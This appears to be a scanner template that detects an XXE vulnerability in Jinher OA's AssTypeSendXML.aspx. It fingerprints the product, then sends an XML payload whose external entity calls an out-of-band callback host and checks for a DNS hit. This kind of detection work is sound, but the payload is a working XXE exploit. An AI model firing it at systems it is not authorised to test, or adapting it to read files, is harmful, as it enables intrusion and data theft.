id: poc-yaml-jinher-asstypesendxml-aspx-xxe
info:
  name: JinheOA AssTypeSendXML.aspx XXE Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: xxe,dnslog

variables:
  reverse: '{{interactsh-url}}'

http:
  - method: GET
    path:
      - "{{BaseURL}}/C6/Jhsoft.Web.login/PassWordSlideFull.aspx"
    matchers:
      - type: word
        words:
          - "JHSoft"
        part: body

  - method: POST
    path:
      - "{{BaseURL}}/c6/Jhsoft.Web.Asset/AssTypeSendXML.aspx/"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: |-
      <?xml version="1.0" encoding="UTF-8"?>
      <!DOCTYPE root [
      <!ENTITY % remote SYSTEM "http://{{reverse}}/xxe_test">
      %remote;]>
      <root/>
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "SessionId="
        part: header
      - type: word
        words:
          - ""
        part: body
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
